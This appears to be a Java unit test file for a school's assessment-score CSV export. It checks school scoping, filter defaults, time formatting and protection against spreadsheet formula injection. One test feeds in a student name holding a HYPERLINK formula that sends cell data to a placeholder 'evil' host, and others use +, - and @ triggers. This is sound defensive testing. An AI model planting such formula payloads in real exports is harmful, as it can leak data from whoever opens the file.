package com.sep.vox.application.usecase.assessmentgrading;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;
import static org.mockito.ArgumentMatchers.any;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.never;
import static org.mockito.Mockito.verify;
import static org.mockito.Mockito.when;

import com.sep.vox.domain.model.assessment.AssessmentKind;
import com.sep.vox.domain.model.assessment.AssessmentCandidateResultStatus;
import com.sep.vox.domain.model.assessment.GradingRoundType;
import com.sep.vox.domain.model.assessment.GradingAssignmentStatus;
import java.math.BigDecimal;
import java.time.Instant;
import java.time.OffsetDateTime;
import java.util.List;
import java.util.UUID;

import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.mockito.ArgumentCaptor;

import com.sep.vox.application.port.input.query.assessmentgrading.ExportAssessmentScoresQuery;
import com.sep.vox.application.port.input.service.AssessmentGradingAccessService;
import com.sep.vox.application.port.input.service.AssessmentScoreExportSupport;
import com.sep.vox.application.port.input.usecase.assessmentgrading.ExportAssessmentScoresUseCase;
import com.sep.vox.application.query.dto.AssessmentScoreRowInfo;
import com.sep.vox.application.query.dto.GradingAssignmentFilter;
import com.sep.vox.application.query.repository.AssessmentGradingQueryRepository;

/**
 * This file is opened in Excel by the school admin -- the highest-privilege account in the school
 * -- so a cell typed by a user must not be allowed to become a formula (review BE-9), and one
 * accidental click must not pull the whole school into RAM (review BE-10).
 *
 * <p>Uses the REAL {@link AssessmentScoreExportSupport} instead of mocking it: the permission and scope guard
 * have moved there, and if it were mocked the two guarantees above would no longer be watched by any test.
 */
class ExportAssessmentScoresUseCaseTests {

    private AssessmentGradingQueryRepository assessmentGradingQueryRepository;
    private AssessmentGradingAccessService assessmentGradingAccessService;
    private ExportAssessmentScoresUseCase useCase;

    private final UUID adminId = UUID.randomUUID();
    private final UUID schoolId = UUID.randomUUID();
    private final UUID assessmentId = UUID.randomUUID();

    @BeforeEach
    void setUp() {
        assessmentGradingQueryRepository = mock(AssessmentGradingQueryRepository.class);
        assessmentGradingAccessService = mock(AssessmentGradingAccessService.class);
        useCase = new ExportAssessmentScoresUseCase(
            new AssessmentScoreExportSupport(assessmentGradingQueryRepository, assessmentGradingAccessService));

        when(assessmentGradingAccessService.requireActiveUserId()).thenReturn(adminId);
        when(assessmentGradingAccessService.requireCurrentSchoolId(adminId)).thenReturn(schoolId);
        when(assessmentGradingQueryRepository.findScoreRows(any())).thenReturn(List.of());
    }

    private void givenRow(String studentName, Instant releasedAt) {
        when(assessmentGradingQueryRepository.findScoreRows(any())).thenReturn(List.of(
            new AssessmentScoreRowInfo(UUID.randomUUID(), studentName, "hs@example.com", "12A1",
                "IELTS Mock", OffsetDateTime.parse("2026-07-12T08:00:00+07:00").toInstant(),
                new BigDecimal("7.50"), "B2", "RELEASED",
                "INITIAL", "UPHELD", "Cô Lan", releasedAt)));
    }

    private void givenRowWithStudentName(String studentName) {
        givenRow(studentName, null);
    }

    private String export() {
        return useCase.execute(ExportAssessmentScoresQuery.scopedTo(assessmentId, null, null));
    }

    private GradingAssignmentFilter capturedFilter() {
        ArgumentCaptor<GradingAssignmentFilter> captor = ArgumentCaptor.forClass(GradingAssignmentFilter.class);
        verify(assessmentGradingQueryRepository).findScoreRows(captor.capture());
        return captor.getValue();
    }

    @Test
    void should_require_an_assessment_or_a_schedule_scope() {
        assertThatThrownBy(() -> useCase.execute(ExportAssessmentScoresQuery.scopedTo(null, null, null)))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("assessment or schedule");

        verify(assessmentGradingQueryRepository, never()).findScoreRows(any());
    }

    @Test
    void should_accept_a_schedule_only_scope() {
        UUID scheduleId = UUID.randomUUID();

        useCase.execute(ExportAssessmentScoresQuery.scopedTo(null, scheduleId, null));

        GradingAssignmentFilter filter = capturedFilter();
        assertThat(filter.schoolId()).isEqualTo(schoolId);
        assertThat(filter.assessmentId()).isNull();
        assertThat(filter.scheduleId()).isEqualTo(scheduleId);
    }

    /** The school comes from the login session, not from the query -- the guard against cross-school export. */
    @Test
    void should_scope_the_filter_to_the_school_of_the_caller() {
        export();

        assertThat(capturedFilter().schoolId()).isEqualTo(schoolId);
    }

    /**
     * Leaving the kind empty must NOT be understood as "both": the previous score export query did not
     * filter kind, so exporting from the class test screen dragged in the scores of centralized assessments too.
     */
    @Test
    void should_default_the_assessment_kind_to_centralized() {
        export();

        assertThat(capturedFilter().assessmentKind()).isEqualTo("CENTRALIZED");
    }

    @Test
    void should_pass_the_class_test_kind_through() {
        useCase.execute(ExportAssessmentScoresQuery.scopedTo(assessmentId, null, AssessmentKind.CLASS_TEST));

        assertThat(capturedFilter().assessmentKind()).isEqualTo("CLASS_TEST");
    }

    @Test
    void should_pass_the_screen_filters_through() {
        UUID teacherId = UUID.randomUUID();

        useCase.execute(new ExportAssessmentScoresQuery(assessmentId, null, teacherId,
            AssessmentCandidateResultStatus.RELEASED, GradingRoundType.APPEAL, GradingAssignmentStatus.COMPLETED,
            true, true, Boolean.TRUE, "  nguyen  ", AssessmentKind.CLASS_TEST));

        GradingAssignmentFilter filter = capturedFilter();
        assertThat(filter.teacherId()).isEqualTo(teacherId);
        assertThat(filter.resultStatus()).isEqualTo("RELEASED");
        assertThat(filter.roundType()).isEqualTo("APPEAL");
        assertThat(filter.assignmentStatus()).isEqualTo("COMPLETED");
        assertThat(filter.unassignedOnly()).isTrue();
        assertThat(filter.overdueOnly()).isTrue();
        assertThat(filter.hasOpenAppeal()).isTrue();
        assertThat(filter.keyword()).isEqualTo("nguyen");
    }

    /**
     * An empty string from the query string means "no filter"; if left as it is, `cr.status = ''`
     * produces an empty file.
     */
    @Test
    void should_treat_a_blank_filter_as_no_filter() {
        useCase.execute(new ExportAssessmentScoresQuery(assessmentId, null, null, null, null, null,
            false, false, null, "   ", null));

        GradingAssignmentFilter filter = capturedFilter();
        assertThat(filter.resultStatus()).isNull();
        assertThat(filter.roundType()).isNull();
        assertThat(filter.assignmentStatus()).isNull();
        assertThat(filter.keyword()).isNull();
    }

    @Test
    void should_neutralize_a_cell_that_starts_like_a_formula() {
        givenRowWithStudentName("=HYPERLINK(\"http://evil/?x=\"&A1,\"Nhấn vào đây\")");

        // The leading single quote is what stops Excel from RUNNING this cell when the file is opened.
        assertThat(export()).contains("\"'=HYPERLINK(");
    }

    @Test
    void should_neutralize_the_other_formula_triggers_too() {
        for (String trigger : List.of("+", "-", "@")) {
            givenRowWithStudentName(trigger + "cmd");

            assertThat(export()).contains("\"'" + trigger + "cmd\"");
        }
    }

    @Test
    void should_leave_an_ordinary_name_untouched() {
        givenRowWithStudentName("Nguyễn Văn A");

        assertThat(export()).contains("\"Nguyễn Văn A\"").doesNotContain("'Nguyễn");
    }

    @Test
    void should_still_escape_quotes_inside_a_cell() {
        givenRowWithStudentName("Trần \"Bo\" Nam");

        assertThat(export()).contains("\"Trần \"\"Bo\"\" Nam\"");
    }

    @Test
    void should_print_the_sitting_time_in_vietnam_time() {
        givenRowWithStudentName("Nguyễn Văn A");

        // The source is 08:00+07:00; the output must be 08:00 no matter which time zone the JVM runs in.
        assertThat(export()).contains("\"08:00 12/07/2026\"");
    }

    @Test
    void should_print_the_release_time_in_vietnam_time_too() {
        givenRow("Nguyễn Văn A", OffsetDateTime.parse("2026-07-20T03:30:00Z").toInstant());

        // The same file, the same reader: the "publish time" must not be a raw ISO timestamp
        // in UTC while the "assessment schedule" is already in Vietnam time.
        assertThat(export()).contains("\"10:30 20/07/2026\"").doesNotContain("2026-07-20T03:30");
    }

    @Test
    void should_end_every_line_with_crlf() {
        givenRowWithStudentName("Nguyễn Văn A");

        assertThat(export().lines()).hasSize(2);
        assertThat(export()).contains("\r\n").doesNotContain("\n\n");
    }
}
